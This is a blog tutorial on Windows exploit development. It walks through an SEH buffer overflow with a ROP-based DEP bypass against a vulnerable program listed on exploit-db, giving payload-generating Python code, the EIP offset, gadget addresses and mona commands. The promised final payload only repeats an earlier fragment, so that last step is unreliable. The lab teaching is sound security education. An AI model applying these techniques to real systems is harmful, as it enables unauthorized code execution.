I"õA<p>Hello world!</p>

<p>Before we getting start with the content, I would like to mentioned that this material is not meant for beginner. If you never done Windows Exploit Development before I suggest to start reading my old blog about breaking the code series(<a href="https://court-of-testing-analysing.blogspot.com/2019/11/breaking-code-exploit-development.html">link</a>) this will give a general idea on how to setup and conduct research on windows binary.</p>

<p>This post was inspired from the following <a href="https://www.exploit-db.com/exploits/46283">exploit-db</a>. You may notice later that I used different exploit to gain control of the program but the approach still the same with the original author.</p>

<h2> Setup Windows Lab </h2>

<p>In this lab I used Windows 7 from windows IE developer official (<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">website</a>) and install several tools for exploit development in it, such as:</p>

<ul>
  <li>
    <p>Python 2.7</p>
  </li>
  <li>
    <p>Immunity Debugger</p>
  </li>
  <li>
    <p>Mona</p>
  </li>
  <li>
    <p>The vulnerable program, you can download it from the following <a href="https://www.exploit-db.com/exploits/46283">link</a></p>
  </li>
</ul>

<p>Note 1: DEP is set to always ON!</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp1.png" alt="PLIST-FILE_3" /></p>

<p>DEP is stands for Data Execution Prevention. This security mechanism is used to make the stack area of program to be not executable, thus, this means if we try to put shellcode in the stack it will failed. To bypass this protection, we will use ROP(Return Oriented Programming) to reuse the code inside the program to call virtualprotect function in order to make the stack area executable again.</p>

<p>Note 2: Exploit offset calculation is based on the how long is the username of the windows machine, in this case my username is IEUser.</p>

<p>Note 3: To get accurate result when debugging the exploit, everytime the program crash you need to detach the immunity debugger, restart the program and attach it again. I know it‚Äôs a lot of work.</p>

<h2> Crash and Take Over the Program EIP </h2>

<p>First, we need to crash the program and take over the EIP register. This register is the one responsible to control the execution flow.</p>

<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">2000</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"[!] payload.txt ready to uploaded"</span></code></pre></figure>

<p>The following python code will generate a payload.txt file that will crash the program by overwritting the EIP register. Upload the file by go to the ‚Äúcomputer‚Äù section and choose ‚ÄúFrom Text File‚Äù.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp2.png" alt="PLIST-FILE_3" /></p>

<p>Then go to the immunity debugger, you need to type ‚Äúshift+f9‚Äù to jump the SEH exception to get the following result. If you having trouble to used this shortcut you can go to virtualbox options ‚Äúinput‚Äù &gt; ‚Äúkeyboard‚Äù &gt; ‚ÄúSoft Keyboard‚Äù to emulate this shortcut.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp3.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<p>At this stage, we need to know at what offset in our input to gain control of the EIP register, we will be using one of the mona features to generate pattern for the payload.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp4.png" alt="PLIST-FILE_3" /></p>

<p>To get the pattern you can go to immunity folder and look for pattern.txt file. Copied the content under ASCII section and update the previous python source code to used this payload.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp5.png" alt="PLIST-FILE_3" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp6.png" alt="PLIST-FILE_3" /></p>

<p>Upload the new payload to the vulnerable program and don‚Äôt forgot to pass the exception using ‚Äúshift+f9‚Äù shortcut. The EIP now is overwrite with the pattern, next we will use mona feature to get the exact location of our input to control the EIP.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona findmsp</code></pre></figure>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp7.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp8.png" alt="PLIST-FILE_3" /></p>

<p>Using the following command, we are able to identify the offset of our EIP which is 207. But how about the SEH exception? that would be not much of problem, why? if you look closely the SEH is located 4 bytes(211) after the EIP so all we need to do is to find a gadget that jump to the next 8 or more bytes in the stack so we will no get caught up in the SEH exception.</p>

<p>There are a lot of gadgets inside the program that can be used to satisfy the condition but because I‚Äôm lazy, I‚Äôm just going to used the one that suggested by the original author. It‚Äôs located at 0x10013e29 and it points to instructions:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">add</span> <span class="nb">ESP</span><span class="p">,</span><span class="mh">0xC</span>
<span class="nf">RETN</span></code></pre></figure>

<p>this instructions basically will increment the ESP value to 12 bytes, thus, this will jump the nSEH and SEH and make the execution return to the stack. Update the source code:</p>

<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">207</span>
<span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="mh">0x10013e29</span><span class="p">)</span>
<span class="n">junk</span> <span class="o">=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">12</span>
<span class="n">junk</span> <span class="o">+=</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">1000</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">junk</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"[!] payload.txt ready to uploaded"</span></code></pre></figure>

<p>Put breakpoint at 0x10013e29, so we know that the exploit is working. I suggest to use hardware breakpont in immunity debugger so you don‚Äôt have to put breakpoint multiple times. After that you can upload the new payload and pass the exception, at the end you will be end up at your breakpoint like below:</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp9.png" alt="PLIST-FILE_3" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp10.png" alt="PLIST-FILE_3" /></p>

<p>Continue the execution by click ‚Äústep over‚Äù 2 times this will make the program jump next 10 bytes and return the execution to the stack, cool!</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp11.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<h2> Constructing ROP Chain </h2>

<p>Now, it‚Äôs time to create the ROP Chain so we can reuse the instruction in the program and execute virtualprotect() function.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
  <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
<span class="p">);</span></code></pre></figure>

<p>Some tips to create ROP Chain in windows, make sure to use gadgets that the following features is set to false:</p>

<ul>
  <li>
    <p>Rebase, although this is not security mechanism. This module will move instructions of used modules inside the program if there is conflicted address.</p>
  </li>
  <li>
    <p>ASLR, randomize the instructions of the library</p>
  </li>
</ul>

<p>You can check it using mona by using this command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona modules</code></pre></figure>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp12.png" alt="PLIST-FILE_3" height="300px" width="700px" /></p>

<p>In shorts, there are 4 DLL that we can used to construct ROP chain:</p>

<ul>
  <li>
    <p>sqlite3.dll</p>
  </li>
  <li>
    <p>ssleay32.dll</p>
  </li>
  <li>
    <p>MSVCR71.dll</p>
  </li>
  <li>
    <p>LIBEAV32.dll</p>
  </li>
</ul>

<p>Using this information lets create ROP chain using mona:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona rop <span class="nt">-m</span> sqlite3.dll,ssleay32.dll,MSVCR71.dll,LIBEAV32.dll <span class="nt">-cpb</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">1a"</span></code></pre></figure>

<p>the following command instruct mona create ROP Chain with 4 modules that have mentioned before and make sure the instructions don‚Äôt have this 4 bad characters. We need to get rid this 4 bad characters, so our exploit is not altered at runtime.</p>

<p>So this is going to be my strategy to construct the ROP:</p>

<p>As we know 32 bit binary used stack to put the parameter of called function, thus, I will used pushad instruction that will get all of the content of registers and put it in the stack following this order:</p>

<p>EAX, ECX, EDX, EBX, EBP, ESI and EDI</p>

<p>Each of this register will be contain the following value(I combined the ROP Chain by using rop_chain.txt and rop.txt file that generated by mona using the previous command):</p>

<p>EAX -&gt; Virtualprotect() function pointer</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">EAX</span><span class="p">,</span> <span class="nv">RETN</span>
<span class="nf">IAT</span> <span class="o">&amp;</span><span class="nv">VirtualProtect</span></code></pre></figure>

<p>ECX -&gt; Address of any location inside the program that is writable (lpfOldProtect)</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">ECX</span><span class="p">,</span> <span class="nv">RETN</span>
<span class="err">0</span><span class="nf">x7c38c777</span></code></pre></figure>

<p>EDX -&gt; Protection level flag 0x40(set to be executable again) (flNewProtect). Since there is going to be null byte we are going to use neg instruction that will flip each of the bits.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">EDX</span><span class="p">,</span> <span class="nv">RET</span>
<span class="err">0</span><span class="nf">xffffffc0</span>
<span class="nf">NEG</span> <span class="nb">EDX</span><span class="p">,</span> <span class="nv">RET</span></code></pre></figure>

<p>EBX -&gt; Affected number of bytes we will set this to 0x201(shellcode size, more or less) (dwSize).</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">EAX</span><span class="p">,</span> <span class="nv">RET</span>
<span class="err">0</span><span class="nf">xfffffdff</span>
<span class="nf">NEG</span> <span class="nb">EAX</span><span class="p">,</span> <span class="nv">RET</span>
<span class="nf">POP</span> <span class="nb">EBX</span><span class="p">,</span> <span class="nv">RET</span>
<span class="err">0</span><span class="nf">xffffffff</span>
<span class="nf">INC</span> <span class="nb">EBX</span><span class="p">,</span> <span class="nv">RET</span>
<span class="nf">ADD</span> <span class="nb">EBX</span><span class="p">,</span><span class="nb">EAX</span> 
<span class="nf">XOR</span> <span class="nb">EAX</span><span class="p">,</span><span class="nb">EAX</span><span class="p">,</span> <span class="nv">RETN</span></code></pre></figure>

<p>EBP -&gt; Any gadget that will return the execution back to the stack</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">EBP</span><span class="p">,</span> <span class="nv">RET</span>
<span class="nf">POP</span> <span class="nb">EBP</span><span class="p">,</span> <span class="nv">RET</span></code></pre></figure>

<p>EDI -&gt; ROP NOP(JUNK)</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">EDI</span><span class="p">,</span> <span class="nv">RET</span>
<span class="nf">RET</span></code></pre></figure>

<p>ESI -&gt; Jump to EAX to execute VirtualProtect(). To get the pointer we will used mona again:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona find <span class="nt">-type</span> instr <span class="nt">-s</span> <span class="s2">"JMP DWORD PTR DS:[EAX]"</span> <span class="nt">-m</span> sqlite3.dll,ssleay32.dll,MSVCR71.dll,LIBEAV32.dll <span class="nt">-cpb</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">1a"</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">POP</span> <span class="nb">ESI</span><span class="p">,</span> <span class="nv">RET</span>
<span class="nf">JMP</span> <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">DS</span><span class="p">:[</span><span class="nb">EAX</span><span class="p">]</span> <span class="o">-&gt;</span> <span class="nv">pointer</span></code></pre></figure>

<p>Using this information our final payload will be:</p>

<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">POP</span> <span class="n">ESI</span><span class="p">,</span> <span class="n">RET</span>
<span class="n">JMP</span> <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">DS</span><span class="p">:[</span><span class="n">EAX</span><span class="p">]</span> <span class="o">-&gt;</span> <span class="n">pointer</span></code></pre></figure>

:ET